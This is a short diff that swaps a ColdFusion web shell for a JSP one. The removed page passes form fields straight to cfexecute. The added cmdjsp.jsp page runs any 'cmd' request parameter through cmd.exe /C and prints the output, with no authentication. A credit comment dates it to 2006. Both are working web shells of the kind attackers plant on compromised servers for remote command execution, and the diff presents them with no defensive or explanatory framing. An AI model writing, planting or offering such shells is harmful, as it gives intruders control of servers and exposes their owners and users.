@@ -1,32 +1,32 @@
-<html>
-<body>
+// note that linux = cmd and windows = "cmd.exe /c + cmd" 
 
-<cfoutput>
-<table>
-<form method="POST" action="">
- <tr>
-  <td>Command:</td>
-  <td> < input type=text name="cmd" size=50<cfif isdefined("form.cmd")> value="#form.cmd#" </cfif>> < br></td>
- </tr>
- <tr>
-  <td>Options:</td>
-  <td> < input type=text name="opts" size=50 <cfif isdefined("form.opts")> value="#form.opts#" </cfif> >< br> </td>
- </tr>
- <tr>
-  <td>Timeout:</td>
-  <td>< input type=text name="timeout" size=4 <cfif isdefined("form.timeout")> value="#form.timeout#" <cfelse> value="5" </cfif> > </td>
- </tr>
-</table>
-<input type=submit value="Exec" >
+<FORM METHOD=GET ACTION='cmdjsp.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
 </FORM>
 
-<cfsavecontent variable="myVar">
-<cfexecute name = "#Form.cmd#" arguments = "#Form.opts#" timeout = "#Form.timeout#">
-</cfexecute>
-</cfsavecontent>
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) {
+            output += s;
+         }
+      }
+      catch(IOException e) {
+         e.printStackTrace();
+      }
+   }
+%>
+
 <pre>
-#myVar#
+<%=output %>
 </pre>
-</cfoutput>
-</body>
-</html>
+
+<!--    http://michaeldaw.org   2006    -->
